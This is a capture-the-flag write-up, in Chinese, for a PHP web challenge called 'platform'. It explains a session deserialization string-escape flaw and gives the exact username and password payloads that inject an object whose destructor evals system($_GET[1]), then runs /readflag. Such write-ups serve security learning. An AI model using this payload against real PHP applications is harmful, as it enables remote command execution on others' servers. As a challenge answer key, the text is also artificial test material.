# platform

> 分类：Web

## 题目描述

PHP 题，www.zip 源码泄露。session 开启且对 session 数据中的字符做替换（过滤恶意字符串置空），存在字符串逃逸，配合 `notouchitsclass` 类的 `__destruct` eval 执行命令。flag 无权限，用 SUID 的 /readflag。

## 考察知识点

- PHP session 反序列化字符串逃逸
- 反序列化 `__destruct` eval

## 解法

1. `class.php` 中有 `notouchitsclass` 类，`__destruct()` 里 `eval($this->data)`。
2. 过滤函数把恶意字符串（如 `exec`、`system` 等）`str_replace` 置空，利用长度变化实现字符串逃逸。
3. 构造 username 填充 `execevalexeceval...` 使 session_key 逃逸，password 注入恶意序列化：

```
username=execevalexecevalexecevalexecevalexecexecexecevalexeceval
password=;session_key|O:15:"notouchitsclass":1:{s:4:"data";s:17:"syssystemtem($_GET[1]);";}password|s:1:"a
```

4. 访问 `dashboard.php?1=/readflag`（/readflag 有 SUID）触发 `__destruct` 执行读取 flag。

## 参考答案

（flag 通过 /readflag SUID 读取）

## 来源

- 作者：yemaster | https://blog.yemaster.cn/post/123
- 作者：or4nge | https://cn-sec.com/archives/3364589.html
- 作者：星盟安全团队 | https://blog.xmcve.com/2024/11/04/强网杯2024-Writeup/
- 作者：狼组安全团队 | https://cn-sec.com/archives/3354853.html
